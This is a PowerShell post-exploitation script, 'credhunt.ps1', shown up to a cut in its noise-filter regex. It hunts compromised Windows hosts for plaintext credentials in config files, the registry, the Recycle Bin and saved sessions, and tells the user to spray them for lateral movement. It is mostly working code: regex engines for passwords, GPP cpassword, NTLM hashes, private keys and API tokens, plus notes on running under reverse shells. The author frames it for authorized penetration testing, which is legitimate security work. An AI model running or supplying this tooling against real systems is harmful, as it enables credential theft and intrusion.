<#
    credhunt.ps1 - plaintext credential hunter for Windows post-exploitation
                   (OSCP-style enumeration). Windows sibling of credhunt.sh.

    PURPOSE
      Once you have a foothold on a host you are AUTHORIZED to test, find the
      credentials an admin or an application left lying around in cleartext (or
      in a trivially-recoverable form): config files, answer files, the
      registry, saved sessions, histories, notes and service stores. Then spray
      them for lateral movement.

    AUTHORIZED TESTING ONLY. Run only on hosts you own or have written
    permission to test.

    SCOPE / SAFETY (deliberate limits - this is a locator, not a privesc tool):
      * READ-ONLY. It never modifies the target: no registry writes, no file
        writes, no service/scheduled-task changes. The ONLY thing it writes is
        the -OutFile you pass explicitly.
      * No privilege escalation. It does not test unquoted service paths,
        AlwaysInstallElevated, writable service binaries or token privileges.
        Use winPEAS / PrivescCheck for that. Keeping this read-only makes it
        safe to run during an exam.
      * No decryption, no memory access. It reports WHERE a credential is and
        what the raw value looks like. It does not touch LSASS, does not decrypt
        DPAPI blobs, and does not read browser credential stores - those need
        offline tooling, so the script could only ever point at the file anyway.

    TARGET ENVIRONMENT
      PowerShell 5.1, which ships in-box on Win10/11 and Server 2016+, so there
      is nothing to install on the target. Written to also run on older boxes
      (Server 2012/2016 era): no ConvertFrom-Json, no Get-ChildItem -File, no
      ternary / null-coalescing operators, no PS classes.

    USAGE
      powershell -ep bypass -f .\credhunt.ps1 [-OutFile out.txt]
                 [-Quick] [-Deep] [-Root D:\mount]
                 [-MaxSizeKB 2048] [-MaxHits 25] [-NoColor]

    TIERS
      (default)  known-location checks + a pruned sweep of likely dirs
      -Quick     known credential files/registry only (fastest)
      -Deep      add a full-drive content grep (slow)

    VERSION HISTORY (bumped each round of real-target fixes - see $VERSION)
      2.0  initial fresh build: all 7 sections, detection engine + fixtures
      2.1  sweep false positives from live runs: .NET publicKeyToken/
           assemblyIdentity, $(...)/${...} template forms, camelCase ...Token,
           minified/bundled JS (long-line guard + name skip), binary blobs
           added to SKIP_EXT, default sweep scoped out of Program Files/
           Windows (-Deep re-includes), -OutFile self-exclusion, filename-
           boundary $NAME_RE (kills compass/bypass FPs)
      2.2  Proving Grounds DVR4: indexed/suffixed config keys (Password0=,
           Password1=) now match: -Exclude flag for carried tool dirs,
           auto-exclusion of common tool names (kerberoast/mimikatz/peas/...),
           PSCredential ::Empty / New-Object idiom noise filtered
      2.3  xampp/locked-file hosts: content reads go through a shared-read
           FileStream instead of Select-String (reads files another process
           holds open, e.g. MySQL's C:\xampp\tmp\*.tmp, instead of erroring);
           reparse-point/junction loops skipped in the walk (fixes a hang and
           duplicate ProgramData/"All Users" reports); Grep-One wrapped with
           trap+try/catch and trims the $Error entries it generates, so a
           fully-handled skip can't be echoed by a prompt/theme that renders
           $Error as an uncaught failure
      2.4  restricted/reverse-shell hosts: ALL output switched from Write-Host
           (talks to the console-host UI - many reverse/socket shells never
           render it, so every line this script ever produced was silently
           discarded, which is why only the one error that escapes through a
           different path was ever visible) to the ordinary success/pipeline
           stream, with ANSI escapes for colour instead of -ForegroundColor.
           -OutFile and -Exclude now resolve a relative path against
           PowerShell's own Get-Location instead of the raw .NET process
           working directory, which can silently diverge (confirmed live: a
           relative -OutFile was landing, Access-Denied, in a LibreOffice
           install folder while the prompt showed a normal user directory)
      2.5  fixed a regression 2.4 introduced: Emit's Write-Output shared the
           pipeline with every function's `return` value, so any caller that
           captured one (Grep-Paths/Grep-Dirs/Show-File via `$n = Func` or
           `$n += Func`) silently absorbed ALL the display text that function
           produced along with its real count/bool - hiding entire sections
           on the console (confirmed: Pattern sweep showed in -OutFile but
           not on screen) and breaking `+=` on the resulting mixed array
           ("does not contain a method named 'op_Addition'", seen in the Web
           section). Emit switched to [Console]::Out, a side effect never
           part of a return value - this fixed the pollution but (per 2.6
           below) broke shell visibility again on the same target. Also from
           the same live HEPET/xampp run:
           a nested sub-key matching a placeholder word (IIS-style
           connectionString="Password=hunter2") no longer hides the real
           secret that follows it; a value that's a method call on an object
           ($x->getTokens()) is now treated as a code idiom, not a secret;
           PHP's PEAR package tree (bundled by xampp - PHPUnit,
           PHP_CodeSniffer, PHP_CodeCoverage) is now pruned like
           node_modules/vendor, removing hundreds of vendored-library matches
      2.6  2.5's [Console]::Out fix was wrong: confirmed live on the same
           HEPET target, it rendered NOTHING - that shell relays only
           PowerShell's success/pipeline stream (confirmed by the user's own
           probe: a bare string showed, Write-Host did not), and a raw .NET
           console write bypasses that stream exactly like Write-Host does.
           Emit is back on Write-Output (the one mechanism confirmed to work
           there), and the 2.4 pollution bug is fixed properly this time:
           Grep-Paths/Grep-Dirs/Show-File no longer `return` their count/bool
           through the pipeline at all - they report it via a $script: side-
           channel variable (LastGrepCount / LastShowFile) instead, so the
           pipeline carries only display text and a caller can never capture
           anything that needs separating from it
      2.7  confirmed working end-to-end on HEPET: banner/sections/results all
           render live, colour included. Cleanup from that run: the Winlogon
           autologon finding was one dim wall of "domain= user=X
           AutoAdminLogon=Y password=Z" text (empty domain= included even
           when there isn't one) - split into labelled lines, with the
           password on its own [!] line so it stands out instead of being
           buried in the middle of a paragraph
      2.8  red ([!]) can read as dim/grey on a dark terminal theme, which is
           exactly where the eye needs to land first. Added a new tier for an
           isolated secret VALUE we extracted/decoded ourselves (as opposed
           to a raw file line shown with context, which stays as before):
           bright white. Applied to Winlogon password, PuTTY ProxyPassword,
           VNC password, SNMP community string, WiFi key, and the decoded
           unattend <Value> - the six spots where the thing printed IS the
           secret, not a file reference to go read
      2.9  Winlogon's user/AutoAdminLogon context lines were still grey next
           to a white password, splitting one finding visually in two. New
           NoteW (white, no [!] marker) for context lines that belong to a
           Val finding, so the whole block reads as one unit
      3.0  real miss found by inspecting a live confCons.xml: mRemoteNG was
           only checked under the per-user AppData\Roaming path - a
           machine-wide C:\ProgramData\mRemoteNG install (as seen live) was
           never checked at all. Worse, even the generic sweep likely
           wouldn't have caught it anyway: mRemoteNG writes each <Node> as
           ONE attribute-heavy line that easily exceeds Grep-One's 1500-char
           noise guard, and Show-File's raw dump truncates at 240 chars/line
           - either could silently drop or cut off the password depending on
           attribute order. Added a dedicated Scan-MRemoteNG that checks both
           locations and extracts Name/Hostname/Username/Domain/Password
           directly by regex, immune to both limits, and notes mRemoteNG's
           well-known default-AES-key weakness (plaintext-equivalent exactly
           like GPP cpassword) when no master password was set
      3.1  generalized the 3.0 fix beyond mRemoteNG: the real gap was
           architectural - ANY current or future program that writes one
           attribute-heavy element per line (the mRemoteNG shape) would hit
           the same 1500-char guard and lose its credential, and nobody
           should have to wait for a bespoke Scan-XXX per vendor to catch
           that. Grep-One itself now handles a long line generally: instead
           of dropping it outright, it extracts just the KEYWORD=value
           snippets matching whatever pattern the caller already wanted
           (every known form - assignment, XML attr, URI, etc. - no new
           regex needed), noise-filters each snippet on its own, and bounds
           both snippet length and match count per line - a line with many
           matches is itself the signal of generated/repetitive content (a
           minified blob, a templated line) and stays fully suppressed,
           while a real config's one-credential-per-element line is found.
           This is a safety net underneath the named checks (Scan-MRemoteNG
           keeps its richer, structured output and known-location priority)
           - a brand-new vendor with this file shape is now caught by the
           sweep with zero new code
      3.2  verified 3.1's claim directly: ran the GENERIC engine (no
           Scan-MRemoteNG) against the real confCons.xml attribute set from
           a live target. The real password WAS found with zero app-specific
           code - but the same test surfaced two noise bugs in $ASSIGN/
           $PH_WORD that any real-world XML-attribute config could hit, not
           just mRemoteNG: (1) an EMPTY value (VNCProxyPassword="") let the
           post-operator separator swallow its closing quote and the
           following space, then match the NEXT attribute's name as if it
           were the secret - capped the separator at whitespace + at most
           one quote, so an empty "" fails the value-length check right
           there instead of bleeding through; (2) a keyword match on a
           boolean-ish attribute (RDGatewayUseConnectionCredentials="Yes" -
           "Credential" is a substring) - added yes/no to the placeholder
           list. Both fixed at the shared pattern level, so every known-
           location check and the generic sweep benefit, not just mRemoteNG
      3.3  the folder credhunt runs from is auto-excluded (your transferred
           toolkit - RunasCs, Powermad, LAPSToolkit, wordlists - was flooding
           the sweep), unless it's a shared location where real creds live
           (profile root/Desktop/Documents/Downloads, Windows, Temp, etc.).
           Shown in the banner; -NoSelfExclude turns it off
      3.4  vendor-noise pass from a live DC run (137 sweep hits, 0 real):
           Chromium component trees pruned by name/shape - 'Edge Wallet'
           (wallet UI strings), 'ZxcvbnData' (password-strength wordlist,
           was a name-loot hit) and <User Data>\<profile>\Extensions
           (minified JS 'withCredentials'); rest of User Data still swept.
           Pruned ProgramData\Microsoft\IdentityCRL (live.com reset URLs),
           ProgramData\Microsoft\Windows\OneSettings, ProgramData\Amazon\SSM
           Logs + runtimeconfig (IMDS timeouts / instance id). Process scan:
           '-p' only counts when a value follows (svchost '-k Grp -p -s svc'
           was flagged). cmdkey: the stock WindowsLive virtualapp/didlogical
           target is hidden. Services: \Driver\ / \FileSystem\ objects are
           not accounts (WUDFRd)
      3.5  Recycle Bin was pruned wholesale - missed a '.eml' with a saved
           password on a user's Desktop recycle bin (404-bank, HSL). Removed
           the $Recycle.Bin prune and added a dedicated section that reads
           every user's $Recycle.Bin\<SID>\$I* metadata to show the ORIGINAL
           path, filename and deletion time for each deleted file, pairs it
           with the $R* content, flags loot-y extensions (.eml/.kdbx/.pfx/
           .ppk/.rdp/.config/.ini/.sql/.ps1/.bat/.txt/.env/password*/
           cred*/secret*/vault*) and greps readable content with CRED_RE.
           Added '.eml' to $TEXT_EXT so the generic sweep reads mail files
#>

[CmdletBinding()]
param(
    [string] $OutFile,             # -OutFile    also append plain-text output here (the ONLY write)
    [switch] $Quick,               # -Quick      known cred locations only, skip the sweep
    [switch] $Deep,                # -Deep       grep whole drive(s), not just curated dirs
    [string] $Root = '',           # -Root       scan an offline image / subtree instead of live C:
    [int]    $MaxSizeKB = 2048,    # -MaxSizeKB  skip files larger than this during content greps
    [int]    $MaxHits = 25,        # -MaxHits    max matching lines printed per check
    [string[]] $Exclude = @(),     # -Exclude    path(s) to skip entirely (your own tools dir, mounts)
    [switch] $NoSelfExclude,       # -NoSelfExclude  also scan the folder credhunt was run from
    [switch] $NoColor,             # -NoColor    disable colour
    [switch] $Help                 # -Help
)

$VERSION  = '3.5'
$MAXCOL   = 240                               # truncate displayed lines to this width
$MaxBytes = [int64]$MaxSizeKB * 1024

# ---------------------------------------------------------------------------
# Base path. Default live scan is C:\ ; -Root scopes the ENTIRE scan under a
# subtree (a mounted offline image, a second disk). Registry/process/live-state
# sections are meaningless against an offline image and skip themselves when
# -Root is set (handled in those sections, mirroring how credhunt.sh skips
# scan_procs when given a --root).
# ---------------------------------------------------------------------------
if ($Root -ne '') {
    if (-not (Test-Path -LiteralPath $Root)) {
        Write-Error "credhunt: -Root '$Root' is not a valid path"; exit 1
    }
    $Base      = (Get-Item -LiteralPath $Root).FullName.TrimEnd('\')
    $IsOffline = $true
} else {
    $sysdrive  = $env:SystemDrive; if (-not $sysdrive) { $sysdrive = 'C:' }
    $Base      = $sysdrive
    $IsOffline = $false
}

# Base-relative path join. Use for every curated location so -Root just works.
function BP([string]$rel) { return (Join-Path $Base $rel) }

# Resolve a user-supplied relative path against PowerShell's OWN tracked
# location ($PWD / Get-Location), never the raw .NET process working
# directory. The two diverge whenever the process that spawned this shell
# (a reverse shell, a macro-spawned shell, many non-interactive agents) left
# [Environment]::CurrentDirectory pointed somewhere else - a .NET call that
# resolves a relative path implicitly (File.Open, File.WriteAllText,
# [IO.Path]::GetFullPath) silently lands in THAT stale directory instead of
# where the user's prompt says they are. Seen for real: PowerShell's prompt
# showed a project folder while a bare .NET relative write landed in
# C:\Program Files\LibreOffice\program - Access Denied, silently swallowed.
function Resolve-UserPath {
    param([string]$p)
    if (-not $p) { return $p }
    if ([System.IO.Path]::IsPathRooted($p)) { return $p }
    return (Join-Path (Get-Location).Path $p)
}

# Common derived roots (also honour -Root).
$UsersDir = BP 'Users'

# -Exclude: absolute subtrees to skip entirely (your carried tools, mounts).
$script:ExcludeLC = @()
foreach ($e in $Exclude) {
    if ($e) { try { $script:ExcludeLC += ([System.IO.Path]::GetFullPath((Resolve-UserPath $e))).ToLower().TrimEnd('\') } catch { } }
}
# Auto-exclude the folder this script lives in: on a target it's your staging
# dir, and everything you transferred with it (RunasCs, Powermad, LAPSToolkit,
# wordlists...) is full of sample creds and keyword-heavy source that would
# otherwise flood the output. Skipped when that folder is a SHARED location
# where real target creds live (drive root, a profile root or its Desktop/
# Documents/Downloads, anything under Windows, ProgramData, Program Files,
# Temp roots) - there, use -Exclude for your tools instead. -NoSelfExclude
# turns it off. In-memory (iex) runs have no script folder, so nothing changes.
function Is-SharedDir {
    param([string]$d)
    $l = $d.ToLower().TrimEnd('\')
    foreach ($r in @($Base, $UsersDir, (BP 'Windows'), (BP 'ProgramData'), (BP 'Program Files'),
                     (BP 'Program Files (x86)'), (BP 'Temp'), $env:TEMP)) {
        if ($r -and $l -eq $r.ToLower().TrimEnd('\')) { return $true }
    }
    if ($l.StartsWith((BP 'Windows').ToLower() + '\')) { return $true }
    $u = $UsersDir.ToLower().TrimEnd('\')
    if ($l.StartsWith($u + '\')) {
        $rest = $l.Substring($u.Length + 1).Split('\')
        if ($rest.Count -eq 1) { return $true }
        if ($rest.Count -eq 2 -and (@('desktop','documents','downloads','appdata','onedrive') -contains $rest[1])) { return $true }
    }
    return $false
}
$script:SelfDir = ''; $script:SelfDirExcluded = $false
try {
    $sp = $PSCommandPath; if (-not $sp) { $sp = $MyInvocation.MyCommand.Path }
    if ($sp) { $script:SelfDir = (Split-Path -Parent $sp).TrimEnd('\') }
} catch { }
if ($script:SelfDir -and -not $NoSelfExclude -and -not (Is-SharedDir $script:SelfDir)) {
    $script:ExcludeLC += $script:SelfDir.ToLower()
    $script:SelfDirExcluded = $true
}

function Is-Excluded {
    param([string]$p)
    if (-not $script:ExcludeLC -or -not $p) { return $false }
    $lp = $p.ToLower()
    foreach ($x in $script:ExcludeLC) { if ($lp -eq $x -or $lp.StartsWith($x + '\')) { return $true } }
    return $false
}

# ---------------------------------------------------------------------------
# Output. Plain success-stream output (see Emit below), ANSI for colour, so
# -NoColor strips colour and the -OutFile tee is plain text with no escape
# codes either way. Markers (mirrors credhunt.sh):
#     === section ===      section header
#     --- subsection       sub-header
#     [+] file             a file worth reading
#     [!] file             act on this now (high value)
#     <indented>           matching content, prefixed with line numbers
# ---------------------------------------------------------------------------
$C_SEC   = 'Cyan'
$C_INFO  = 'DarkGray'
$C_FILE  = 'Green'
$C_CRIT  = 'Red'
$C_HIT   = 'Gray'
$C_VALUE = 'White'   # an isolated, decoded/extracted secret value - must pop at a glance

# ANSI colour codes, used instead of Write-Host -ForegroundColor. Write-Host
# talks to the console-host UI, which many restricted/non-interactive shells
# (reverse shells over a raw socket, several C2 "run a command" features) do
# not implement - it silently produces NOTHING, while the ordinary success
# output stream (plain Write-Output / a bare string) always reaches the
# caller. Confirmed on a real target: a bare string showed, Write-Host did
# not - every line this script ever produced was being discarded. ANSI codes
# are just literal bytes in that same reliable stream, so colour survives
# anywhere that interprets them (modern Windows Terminal/console) and is at
# worst a few harmless extra characters anywhere that does not.
$script:AnsiCodes = @{
    Cyan     = "$([char]27)[36m"
    DarkGray = "$([char]27)[90m"
    Green    = "$([char]27)[32m"
    Red      = "$([char]27)[31m"
    Gray     = "$([char]27)[37m"
    White    = "$([char]27)[97m"
}
$script:AnsiReset = "$([char]27)[0m"


$script:OutWriter = $null
if ($OutFile) {
    $OutFile = Resolve-UserPath $OutFile
    try {
        # Explicit, user-requested write - the one permitted side effect.
        $script:OutWriter = New-Object System.IO.StreamWriter($OutFile, $false)
        $script:OutWriter.AutoFlush = $true
    } catch {
        # Emit() isn't defined yet and Write-Host may not even render on this
        # host (see Emit below) - write the failure reason directly to the
        # error stream so it has the best chance of being visible either way.
        $Host.UI.WriteErrorLine("credhunt: cannot open -OutFile '$OutFile': $($_.Exception.Message)")
        $script:OutWriter = $null
    }
}
# Remember the output file's absolute path so the scan never reports itself.
$script:OutFileFull = ''
if ($OutFile) { try { $script:OutFileFull = ([System.IO.Path]::GetFullPath($OutFile)).ToLower() } catch { } }

function Emit {
    param([string]$Color, [string]$Text)
    # Plain success/pipeline-stream output (Write-Output), NOT Write-Host
    # (talks to $Host.UI - many restricted/reverse shells never render it) and
    # NOT [Console]::Out (a raw .NET console write - confirmed on a real
    # target to ALSO go nowhere: that shell hosts PowerShell in a way that
    # only relays the success/pipeline stream, i.e. what a captured Invoke()
    # actually returns). Write-Output is the one mechanism confirmed, by the
    # user's own probe AND a full live run, to render reliably there.
    #
    # This alone is not enough on its own (a real regression once already):
    # it shares a stream with whatever a function `return`s, so a function
    # that both displays via Emit/FileHit/Show-Lines AND needs to report a
    # count/bool to its caller would have that value mixed into the display
    # text - and a caller that captures the result (`$n = Func`) would
    # silently absorb the display text right along with it. The fix lives on
    # the functions that need to report a count (Grep-Paths/Grep-Dirs/
    # Show-File): they use a $script: side-channel variable instead of
    # `return`, so Emit can stay on this confirmed-working stream here
    # without ever polluting a caller's captured value.
    if (-not $NoColor -and $script:AnsiCodes[$Color]) {
        Write-Output ($script:AnsiCodes[$Color] + $Text + $script:AnsiReset)
    } else {
        Write-Output $Text
    }
    if ($script:OutWriter) { try { $script:OutWriter.WriteLine($Text) } catch { } }
}

function Sect    { param([string]$t) Emit $C_SEC ''; Emit $C_SEC "=== $t ===" }
function Sub     { param([string]$t) Emit $C_INFO "--- $t" }
function FileHit { param([string]$t) Emit $C_FILE "  [+] $t" }
function Crit    { param([string]$t) Emit $C_CRIT "  [!] $t" }
function Note    { param([string]$t) Emit $C_INFO  "      $t" }
# An isolated secret value we extracted/decoded ourselves (not a raw file
# line with context around it - that stays Note/$C_HIT). Bright white so the
# one thing worth copy-pasting doesn't get lost in a page of [!]/[+] red and
# green - red in particular can read as dim/grey on dark terminal themes.
function Val     { param([string]$t) Emit $C_VALUE "  [!] $t" }
# Plain indented context (same shape as Note) that belongs to a Val finding -
# e.g. the username/domain next to an extracted password - in the same white
# as Val, no [!] marker, so the whole finding reads as one block, not a
# half-grey/half-white mix.
function NoteW   { param([string]$t) Emit $C_VALUE "      $t" }

# ---------------------------------------------------------------------------
# Bounded output. Caps lines shown per check at -MaxHits and truncates long
# lines to $MAXCOL. This is not cosmetic: on the Linux version, 25 lines of
# noise filled the per-check cap and evicted real findings. Keeping the cap
# and filtering hard (next section) is what keeps signal visible.
# Accepts an array of "line# : text" strings (what the grep helpers produce).
# ---------------------------------------------------------------------------
function Show-Lines {
    param([string[]]$Lines)
    if (-not $Lines) { return }
    $n = 0
    foreach ($line in $Lines) {
        if ($null -eq $line) { continue }
        $n++
        if ($n -gt $MaxHits) {
            Note "... +$($Lines.Count - $MaxHits) more (raise with -MaxHits)"
            return
        }
        $s = $line -replace "`r", '' -replace "`t", '    '
        if ($s.Length -gt $MAXCOL) { $s = $s.Substring(0, $MAXCOL) + ' ...[trunc]' }
        Emit $C_HIT "      $s"
    }
}

function Show-Usage {
@'
credhunt.ps1 - plaintext credential hunter for Windows (OSCP-style enumeration)

  -OutFile FILE   tee findings to FILE (plain text, no colour). The only write.
  -Quick          quick mode: known credential files/registry only
  -Deep           deep mode: grep whole drive(s) for credential patterns (slow)
  -Root PATH      scope the ENTIRE scan under PATH (offline image / second disk)
  -MaxSizeKB N    skip files larger than N KB during content greps (default 2048)
  -MaxHits N      max matching lines printed per check (default 25)
  -Exclude P[,P]  skip these paths entirely (e.g. your own tools: -Exclude C:\tools)
  -NoSelfExclude  also scan the folder credhunt was run from (excluded by default
                  unless it's a shared spot like a profile root, Desktop or Temp)
  -NoColor        disable colour output
  -Help           this message

  Examples:
    .\credhunt.ps1                              # fast pass, curated locations
    .\credhunt.ps1 -OutFile C:\Windows\Temp\ch.txt
    .\credhunt.ps1 -Quick                       # known cred files/registry only
    .\credhunt.ps1 -Deep                        # add a full-drive content grep
    .\credhunt.ps1 -Root D:\                     # scan a mounted image / 2nd disk

  READ-ONLY. Authorized testing only.
'@ | ForEach-Object { Emit $C_INFO $_ }
}

if ($Help) { Show-Usage; exit 0 }

# ===========================================================================
# SECTION 2 - DETECTION ENGINE
# .NET regex, case-insensitive (Select-String and -match default to it, which
# matches the bash `grep -i`). Quote characters inside character classes are
# written as \x22 (") and \x27 (') so PowerShell's own string quoting never
# fights the regex. Patterns are built by concatenation of single-quoted
# fragments: a single-quoted string never interpolates, so a literal regex `$`
# anchor or `\s` is exactly what it looks like.
#
# Two anchoring rules learned from the bash version (bug class: "anchoring"):
#   * Match against the RAW file line (what Select-String returns in .Line and
#     what the noise filter sees). Never against a "path:lineno:content" string.
#     A `$` or `^` anchor is therefore relative to the real line content.
#   * Matching is case-insensitive, so the noise filter is too (same engine).
#     Never use "contains an uppercase letter" as a discriminator - with -i it
#     is silently always true.
# ===========================================================================

$Q = '\x22\x27'                       # the two quote chars, for use inside [ ]

# --- the keyword that introduces a secret ----------------------------------
# NB: bare 'token' requires a non-letter before it, so identifiers that merely
# END in "Token" (ResolveToken, AcquireToken, publicKeyToken) don't match,
# while access_token / "token": / auth-token still do. Same for 'key' forms via
# their prefixes. This kills a large class of .NET / telemetry false positives.
$KW = '(?:pass(?:w(?:or)?d)?|passphrase|pwd|secret|api[-_]?key|apikey' +
      '|access[-_]?key|secret[-_]?key|auth[-_]?token|(?<![A-Za-z])token|bearer|creds?' +
      '|credential|conn(?:ection)?[-_]?str(?:ing)?|dbpass|sa_pass|cpassword)'
# optional qualifier that can trail the keyword: password_hash, api_key_value
$KWSUF = '(?:_?(?:key|keys|value|val|hash|salt|enc|encrypted|plain|text|str|string))?'

# a) assignment:  password = hunter2   DB_PASS: "hunter2"   pwd=hunter2
#    The [A-Za-z0-9_]* after the keyword allows INDEXED / suffixed config keys -
#    Password0=, Password1=, AdminPassword2=, db_password_hash= - a very common
#    form (e.g. Argus DVR DVRParams.ini) that a bare keyword would miss.
#    The post-operator separator allows whitespace then AT MOST ONE quote
#    (not a run of mixed whitespace/quotes) - found live, on a real
#    mRemoteNG confCons.xml: an EMPTY value (VNCProxyPassword="") let the
#    old, greedier separator swallow both the closing quote and the
#    following space, then "bleed through" into the NEXT attribute's name
#    as if it were the secret's value. Capping it at one quote means an
#    empty "" fails the value-length check right there instead of hunting
#    for a match further down the line.
$ASSIGN = $KW + $KWSUF + '[A-Za-z0-9_]*[\s' + $Q + ']*[:=]\s*[' + $Q + ']?[^\s' + $Q + ',;)}<>]{3,}'
# b) function arg: define('DB_PASSWORD','hunter2')  - no '=' anywhere
$FUNCARG = $KW + $KWSUF + '[' + $Q + ']?\s*,\s*[' + $Q + '][^' + $Q + ']{3,}[' + $Q + ']'
# c) creds in a URI: mysql://user:pass@host  ftp://a:b@h  https://u:tok@git
$URI = '[a-zA-Z][a-zA-Z0-9+.-]{1,12}://[A-Za-z0-9._%+~-]{1,64}:[^@\s' + $Q + '/]{1,64}@'
# d) XML - .NET/Java config staple. keyword and value in DIFFERENT attributes,
#    and the <password>x</password> element form (separated by '>' not '=').
$XML_ATTR = 'name\s*=\s*[' + $Q + '][^' + $Q + ']*' + $KW + '[^' + $Q + ']*[' + $Q + '][^>]*value\s*=\s*[' + $Q + '][^' + $Q + ']{3,}[' + $Q + ']'
$XML_ELEM = '<[A-Za-z0-9_.:-]*' + $KW + '[A-Za-z0-9_.:-]*>[^<\s]{3,}</'
# e) prose:  the password is "Summer2023!"   /   Dach's password is Refried...
$PROSE_KW   = '(?:pass(?:word|phrase|code)?|creds?|credentials?)'
$PROSE_MID  = '(?:\s+[A-Za-z0-9_\x27-]+){0,4}'          # up to 4 words in between
$PROSE_VERB = '\s+(?:is|are|was|were)\s+'
$PROSE = '(?:' + $PROSE_KW + $PROSE_MID + $PROSE_VERB + '[' + $Q + '][^' + $Q + ']{3,}[' + $Q + ']' +
         '|'  + $PROSE_KW + $PROSE_MID + $PROSE_VERB + '[^\s]{8,})'
# f) .NET/ADO connection strings (creds split across ; segments)
$CONNSTR = '(?:connectionString\s*=' +
           '|(?:User\s*Id|uid|User|Password|pwd)\s*=\s*[^;\s<]{2,}\s*;?.*(?:Data Source|Server|Initial Catalog|Database)\s*=' +
           '|(?:Data Source|Server|Initial Catalog|Database)\s*=\s*[^;\s<]{2,}\s*;.*(?:User\s*Id|uid|Password|pwd)\s*=)'
# ASP.NET machineKey - lets you forge ViewState, so it is credential-grade
$MACHINEKEY = '(?:validationKey|decryptionKey)\s*=\s*[' + $Q + ']?[0-9A-Fa-f]{16,}'

# The master content pattern. Everything a plain keyword can anchor.
$CRED_RE = '(?:' + $ASSIGN + '|' + $FUNCARG + '|' + $URI + '|' + $XML_ATTR +
           '|' + $XML_ELEM + '|' + $PROSE + '|' + $CONNSTR + '|' + $MACHINEKEY + ')'

# --- patterns with their own display semantics (searched separately) --------
# GPP cpassword (MS14-025). AES key is published, so this is plaintext-grade.
$CPASSWORD = 'cpassword\s*=\s*[' + $Q + ']?[A-Za-z0-9+/=]{4,}'
# Unix crypt(3) hashes - turn up on Windows too (.htpasswd, WSL, app configs)
$HASH_RE = '\$(?:1|2[abxy]|5|6|7|y|gy|md5|apr1|sha1)\$[^\$:\s]{0,64}\$[A-Za-z0-9./]{20,}'
# secretsdump / SAM dump line:  user:rid:lm:nt:::
$NTLM_RE = '[A-Za-z0-9_$.\\-]+:\d+:[A-Fa-f0-9]{32}:[A-Fa-f0-9]{32}:'
# PEM private-key header. Anchored to start-of-line so a script merely NAMING
# the marker in a string does not match (bug class: "script matches itself").
$KEY_RE = '^-----BEGIN (?:[A-Z0-9]+ )?PRIVATE KEY-----'
# PuTTY private key file
$PPK_RE = '^PuTTY-User-Key-File-\d'
# high-signal third-party token formats
$TOKEN_RE = '(?:AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|gh[pousr]_[A-Za-z0-9]{20,}' +
            '|xox[baprs]-[A-Za-z0-9-]{10,}|sk-[A-Za-z0-9]{20,}' +
            '|eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{6,})'
# connect() calls where creds are passed positionally (no keyword to anchor on)
$CONNFN_RE = '(?:SqlConnection|OleDbConnection|OdbcConnection|MySqlConnection' +
             '|NpgsqlConnection|new\s+PDO|mysqli?_connect|pg_connect' +
             '|Net\.NetworkCredential|PSCredential|ConvertTo-SecureString|-AsPlainText)'

# Filename test for the name-loot scan: the keyword must be a WHOLE word in the
# leaf name, so 'compass' / 'bypass' / 'passage' do NOT match 'pass'. The
# [^a-z] boundaries are case-insensitive (so COMPASS is excluded too).
# NB: 'token' deliberately excluded - it is a common whole word in innocent
# filenames (Edge "Trust Tokens" DBs, tile-tokens.js, token_utils.ts) and weak
# signal; real tokens are caught by the content patterns, not by name.
$NAME_RE = '(?i)(?:^|[^a-z])(?:passwords?|passwd|passphrase|password|pass|credentials?|creds?|secrets?|api[_-]?keys?|apikeys?|vaults?)(?:[^a-z]|$)'

# ===========================================================================
# Noise filter. Matching aggressively only pays off if the junk is then
# discarded - on the bash version the junk actively HID real findings by
# filling the capped output. A line is suppressed when it matches $NOISE_RE.
# ===========================================================================
# Placeholder VALUES - what ships in a template where a real secret would go.
# NB: deliberately does NOT contain real sample secrets like 'hunter2' that the
# fixtures use as true positives.
# NB: 'yes'/'no' cover boolean-ish attributes whose NAME merely contains a
# keyword substring - found live on a real mRemoteNG confCons.xml:
# RDGatewayUseConnectionCredentials="Yes" matched via "Credential" inside
# "...Credentials", but "Yes" is answering "use the gateway password?", not
# the password itself. 'no' is included for symmetry even though $ASSIGN's
# {3,} value-length floor would never let a 2-char value match anyway.
$PH_WORD = '(?:YOUR_[A-Z_]*|CHANGE_?ME|changeme|placeholder|example|sample' +
           '|xxx+|foo|foobar|bar|baz|qux|somepassword|mypassword|yourpassword' +
           '|yourpasswordhere|secretpassword|secret|password|passwd|pass|value' +
           '|string|default|true|false|yes|no|none|null|nil|redacted|dummy' +
           '|enter[_-]?password|insert[_-]?password)'
# Template / interpolation tokens - a reference, not a literal secret.
$PH_TOKEN = '(?:\$\([^)]*\)|\$\{[^}]*\}|\$\{?[A-Za-z_][A-Za-z_0-9]*\}?|\{\{[^}]*\}\}|<%[^%]*%>' +
            '|%[A-Za-z_][A-Za-z0-9_()]*%|%[sdvx]|None|null|nil|true|false|\.\.\.)'
# Prose that only TALKS ABOUT a password: "password is required/not set/...".
# The list is the English words that ordinarily follow "is/are/was/were", plus
# any -ly adverb. Ends on a word boundary so "is set" matches but "is setup..."
# (a real value) does not.
$PROSE_NOISE = '(?:is|are|was|were)\s+[' + $Q + ']?(?:required|not|never|always' +
    '|set|unset|empty|blank|correct|incorrect|valid|invalid|wrong|missing' +
    '|changed|expired|enforced|enabled|disabled|stored|hashed|encrypted|case' +
    '|optional|mandatory|the|a|an|your|my|his|her|their|our|used|needed' +
    '|available|unknown|different|same|too|now|also|only|usually|typically' +
    '|generally|located|saved|kept|written|shown|displayed|visible|hidden' +
    '|strong|weak|long|short|secure|insecure|safe|unsafe|sent|shared|reset' +
    '|rotated|configured|defined|provided|accepted|rejected|verified|checked' +
    '|cached|logged|exposed|leaked|compromised|obtained|derived|generated' +
    '|created|supplied|entered|requested|prompted|transmitted|passed|taken' +
    '|computed|compared|matched|returned|truncated|ignored|omitted|arbitrary' +
    '|unique|identical|irrelevant|case-sensitive|writable|readable|randomly' +
    '|automatically|manually|normally|optionally|securely|[a-z]+ly)(?:[^A-Za-z0-9_]|$)'

$NOISE_RE = '(?:' + $PROSE_NOISE +
    '|NOPASSWD|\*{3,}|password_hash|password_verify|PASSWORD_DEFAULT' +
    '|check_password|hashed_password|GetHashCode' +
    # code idioms, never a plaintext secret: ::Empty, = New-Object, = func(...)
    '|::Empty|[:=]\s*New-Object\b|[:=]\s*(?:\$[A-Za-z_][\w]*(?:->|::|\.))?[A-Za-z_][\w.-]*\s*\(' +
